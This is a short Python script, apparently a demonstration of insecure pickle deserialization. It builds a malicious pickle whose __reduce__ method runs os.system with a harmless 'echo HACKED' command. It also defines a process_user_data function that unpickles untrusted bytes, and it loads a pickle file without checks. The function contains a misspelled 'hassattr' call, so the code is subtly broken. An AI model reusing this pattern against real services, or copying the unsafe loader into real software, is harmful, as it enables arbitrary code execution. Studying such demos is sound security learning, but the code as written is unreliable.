import platform

def get_system_info():
    return {
        'system': platform.system(),
        'version': platform.version(),
        'machine': platform.machine(),
    }

info = get_system_info()
#print(info)

import pickle
import os

class FakePlatform:
    def __reduce__(self):
        return (os.system, ('echo HACKED > hacked.txt',))

malicious_data = pickle.dumps(FakePlatform())

"""
with open('malicious.pkl', 'wb') as f:
    f.write(malicious_data)

with open('malicious.pkl', 'rb') as f:
    obj = pickle.load(f) # здесь будет вызван метод reduce"""

def process_user_data(data_bytes):
    obj = pickle.loads(data_bytes)

    if hassattr(obj, 'get_info'):
        print(obj.get_info())
    else:
        return None

with open('system_info.pkl', 'rb') as f:
    sys_info = pickle.load(f)

print(sys_info)
